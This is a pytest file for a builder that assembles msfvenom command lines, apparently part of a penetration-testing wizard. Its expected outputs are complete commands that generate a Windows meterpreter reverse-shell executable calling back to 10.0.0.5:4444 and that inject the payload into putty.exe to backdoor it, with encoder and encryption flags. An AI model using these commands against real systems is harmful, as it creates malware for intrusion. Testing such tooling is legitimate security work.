"""msfvenom builder: shaping-flag coverage (arch/platform/encoder/iterations/
badchars/options/list) plus the new content-gap flags (-x/--template, -k/--keep,
--encrypt)."""

import pytest

from wizard_core.builders import get_builder
from wizard_core.slots import Slot

build = get_builder("msfvenom")


def test_baseline_payload_datastore_output_unchanged():
    plan = build({
        "payload": "windows/x64/meterpreter/reverse_tcp", "lhost": "10.0.0.5",
        "lport": 4444, "format": "exe", "outfile": "shell.exe",
    })
    assert plan.array_form == [
        "msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
        "LHOST=10.0.0.5", "LPORT=4444", "-f", "exe", "-o", "shell.exe",
    ]


def test_list_shortcut_short_circuits_everything_else():
    plan = build({"list": "payloads", "payload": "ignored"})
    assert plan.array_form == ["msfvenom", "--list", "payloads"]


def test_options_dict_expands_to_key_val_tokens():
    plan = build({"payload": "p", "options": {"EXITFUNC": "thread", "PrependMigrate": "true"}})
    assert plan.slot_values[Slot.ACTION_OPTIONS] == ["-p", "p", "EXITFUNC=thread", "PrependMigrate=true"]


def test_options_string_form_from_quick_build_form():
    plan = build({"payload": "p", "options": "EXITFUNC=thread,PrependMigrate=true"})
    assert plan.slot_values[Slot.ACTION_OPTIONS] == ["-p", "p", "EXITFUNC=thread", "PrependMigrate=true"]


def test_shaping_flags_arch_platform_encoder_iterations_badchars():
    plan = build({
        "payload": "p", "arch": "x64", "platform": "windows",
        "encoder": "x86/shikata_ga_nai", "iterations": 3, "badchars": r"\x00\xff",
    })
    assert plan.slot_values[Slot.ACTION_OPTIONS] == [
        "-p", "p", "-a", "x64", "--platform", "windows",
        "-e", "x86/shikata_ga_nai", "-i", "3", "-b", r"\x00\xff",
    ]
    assert any("NOT reliable AV evasion" in n for n in plan.notes)


def test_encrypt_flag():
    plan = build({"payload": "p", "encrypt": "aes256"})
    assert "--encrypt" in plan.array_form and "aes256" in plan.array_form


def test_template_injection_with_keep():
    plan = build({
        "payload": "windows/x64/meterpreter/reverse_tcp", "lhost": "10.0.0.5",
        "lport": 4444, "template": "putty.exe", "keep": True,
        "format": "exe", "outfile": "putty_backdoored.exe",
    })
    assert plan.array_form == [
        "msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
        "LHOST=10.0.0.5", "LPORT=4444", "-x", "putty.exe", "-k",
        "-f", "exe", "-o", "putty_backdoored.exe",
    ]
    assert any("existing executable" in n for n in plan.notes)


def test_template_without_keep_still_injects_but_replaces():
    plan = build({"payload": "p", "template": "putty.exe"})
    assert "-x" in plan.array_form and "putty.exe" in plan.array_form
    assert "-k" not in plan.array_form


def test_keep_without_template_is_ignored_and_noted():
    plan = build({"payload": "p", "keep": True})
    assert "-k" not in plan.array_form
    assert any("only has an effect together with a Template" in n for n in plan.notes)


def test_msfconsole_still_registered_and_unaffected():
    # Sanity: editing the msfvenom builder must not disturb msfconsole's registration.
    plan = get_builder("msfconsole")({"module": "exploit/multi/handler", "action": "exploit -j"})
    assert plan.array_form[0] == "msfconsole"
